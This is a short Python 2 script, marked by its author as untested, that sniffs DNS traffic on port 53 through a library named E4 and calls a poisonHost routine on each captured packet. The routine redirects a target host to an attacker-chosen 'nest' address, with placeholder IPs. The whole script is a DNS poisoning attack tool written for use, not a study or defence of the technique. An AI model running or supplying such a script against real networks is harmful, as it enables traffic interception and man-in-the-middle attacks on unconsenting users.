#!/usr/bin/python

# ----------------------------------------------------------------------
# NOTE THIS SCRIPT HAS NOT BEEN TESTED YET. IT MAY NOT WORK AS EXPECTED.
# ----------------------------------------------------------------------

import E4, E4Dns, sys, time

def main():
    e4Sniffer = E4.AsyncSniffer()
    e4PacketLog = E4.PacketLog()
    e4Dns = E4Dns.Dns()

    e4Sniffer.sniff(packetLog=e4PacketLog, filter='port 53')

    host = E4.NetworkObject(ip='<address>')
    nest = E4.NetworkObject(ip='<address>')

    while True:
        e4PacketLog.waitForPackets()

        for packet in e4PacketLog.takeAll():
            e4Dns.poisonHost(packet=packet, host=host, nest=nest)

def exit():    
    sys.exit()

def interrupt():
    print '\n\nGoodbye.'

def run(main, exit, interrupt):
    try:
        main()
    except KeyboardInterrupt:
        interrupt()
    finally:
        exit()

run(main, exit, interrupt)